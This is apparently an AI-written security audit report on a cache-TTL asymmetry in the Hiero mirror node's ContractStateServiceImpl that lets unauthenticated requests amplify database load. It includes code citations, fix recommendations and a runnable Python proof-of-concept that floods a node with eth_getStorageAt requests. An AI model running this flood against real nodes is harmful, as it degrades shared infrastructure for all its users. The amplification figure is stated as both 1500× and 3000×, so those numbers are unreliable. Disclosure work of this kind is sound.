All four required checks pass. Here is the audit report:

---

Audit Report

## Title
Unauthenticated DB Amplification DoS via `findStorageBatch()` Cache Asymmetry in `ContractStateServiceImpl`

## Summary
A TTL asymmetry between two Caffeine caches used by `ContractStateServiceImpl` allows an unauthenticated attacker to amplify database load by up to 1500× per request. Slot keys accumulate in a 5-minute cache while slot values expire every 2 seconds. After the value cache expires, every incoming request triggers a batch DB query containing all previously accumulated slot keys, not just the requested one. Combined with a single global 500 RPS rate limit, this enables sustained high-volume `WHERE slot IN (1500 slots)` queries against the shared PostgreSQL database.

## Finding Description

**Verified code references:**

`findStorage()` checks `contractStateCache` (TTL: `expireAfterWrite=2s`) for a cached value. On a miss, it unconditionally delegates to `findStorageBatch()`: [1](#0-0) 

Inside `findStorageBatch()`, the requested slot key is added to the per-contract `slotsPerContract` cache (TTL: `expireAfterAccess=5m, maximumSize=1500`), and then **all currently accumulated keys** for that contract are collected and passed to the DB: [2](#0-1) 

The resulting DB query is: [3](#0-2) 

**The asymmetry:**

- `contractStateCache` expires values after 2 seconds: [4](#0-3) 

- `slotsPerContract` retains keys for 5 minutes with a cap of 1500 per contract: [5](#0-4) 

After 2 seconds, all slot values expire from `contractStateCache`, but the 1500 slot keys remain in `slotsPerContract`. Every subsequent request for any of those slots misses the value cache and triggers `findStorageBatch()` with the full 1500-key IN clause.

**The global throttle does not partition by IP.** A single attacker can consume all 500 tokens/second from the single shared `rateLimitBucket`: [6](#0-5) 

Default rate limit: [7](#0-6) 

## Impact Explanation
- **Phase 1 (0–3s):** Attacker sends 500 RPS with unique slot keys targeting one contract. After 1500 requests, `slotsPerContract` is full.
- **Phase 2 (every 2s):** `contractStateCache` expires. All 1500 values are gone. The next 500 requests each trigger `findStorageBatch()` with a 1500-slot IN clause → **500 × 1500 = 750,000 DB row lookups per second**, a 3000× amplification over the baseline single-slot path.

Each query is `WHERE contract_id = X AND slot IN (1500 values)`, requiring an index scan over 1500 keys. At 500 concurrent such queries per second, the PostgreSQL connection pool and I/O are saturated. Because the mirror node DB is shared infrastructure (importer, REST API, web3), saturation degrades all dependent services. The attack resets and repeats automatically every 2 seconds.

## Likelihood Explanation
The attack requires only:
1. Network access to the public web3 JSON-RPC endpoint
2. Any valid contract address with storage slots
3. A script issuing 500 unique `eth_getStorageAt` or `eth_call` requests per second

No authentication, credentials, or privileged knowledge are required. The 500 RPS global limit is the attacker's budget, not a defense. The attack is repeatable indefinitely from a single machine.

## Recommendation
1. **Align cache TTLs:** Set `slotsPerContract` TTL to match or be shorter than `contractState` TTL (e.g., `expireAfterWrite=2s`), so slot keys do not outlive their corresponding values.
2. **Bound the IN clause:** Cap the number of slot keys passed to `findStorageBatch()` to a small constant (e.g., 50–100) regardless of how many keys are accumulated.
3. **Per-IP rate limiting:** Replace the single global `rateLimitBucket` with a per-IP partitioned bucket to prevent a single client from consuming the full 500 RPS budget.
4. **Disable batch caching under load:** The `enableBatchContractSlotCaching` flag (line 30 of `CacheProperties.java`) provides an emergency kill switch; document and operationalize it.

## Proof of Concept
```python
import asyncio, aiohttp, random

TARGET = "http://<mirror-node>:8545"
CONTRACT = "0x<valid_contract_address>"

async def attack():
    async with aiohttp.ClientSession() as session:
        # Phase 1: fill slotsPerContract cache with 1500 unique slots
        tasks = []
        for i in range(1500):
            slot = hex(random.randint(0, 2**256 - 1))
            payload = {"jsonrpc":"2.0","method":"eth_getStorageAt",
                       "params":[CONTRACT, slot, "latest"],"id": i}
            tasks.append(session.post(TARGET, json=payload))
        await asyncio.gather(*tasks)

        # Phase 2: wait for contractStateCache to expire (2s), then flood
        await asyncio.sleep(2.1)
        while True:
            slot = hex(random.randint(0, 2**256 - 1))  # any slot triggers batch
            payload = {"jsonrpc":"2.0","method":"eth_getStorageAt",
                       "params":[CONTRACT, slot, "latest"],"id": 0}
            # 500 concurrent requests, each triggers WHERE slot IN (1500 keys)
            await asyncio.gather(*[session.post(TARGET, json=payload) for _ in range(500)])

asyncio.run(attack())
```

Each iteration of Phase 2 issues 500 DB queries each with a 1500-slot IN clause, sustained indefinitely.

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/service/ContractStateServiceImpl.java (L63-69)
```java
        final var cachedValue = contractStateCache.get(generateCacheKey(contractId, key), byte[].class);

        if (cachedValue != null && cachedValue != EMPTY_VALUE) {
            return Optional.of(cachedValue);
        }

        return findStorageBatch(contractId, key);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/service/ContractStateServiceImpl.java (L90-103)
```java
        contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE);
        final var cachedSlotKeys = contractSlotsCache.getNativeCache().asMap().keySet();

        final var cachedSlots = new ArrayList<byte[]>(cachedSlotKeys.size());
        boolean isKeyEvictedFromCache = true;

        for (var slot : cachedSlotKeys) {
            cachedSlots.add(((ByteBuffer) slot).array());
            if (wrappedKey.equals(slot)) {
                isKeyEvictedFromCache = false;
            }
        }

        final var contractSlotValues = contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/ContractStateRepository.java (L23-28)
```java
    @Query(value = """
                    select slot, value from contract_state
                    where contract_id = :contractId
                    and slot in (:slots)
                    """, nativeQuery = true)
    List<ContractSlotValue> findStorageBatch(@Param("contractId") Long contractId, @Param("slots") List<byte[]> slots);
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L28-28)
```java
    private String contractState = "expireAfterWrite=2s,maximumSize=25000,recordStats";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L39-39)
```java
    private String slotsPerContract = "expireAfterAccess=5m,maximumSize=1500";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L24-32)
```java
    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L34-35)
```java
    @Min(1)
    private long requestsPerSecond = 500;
```
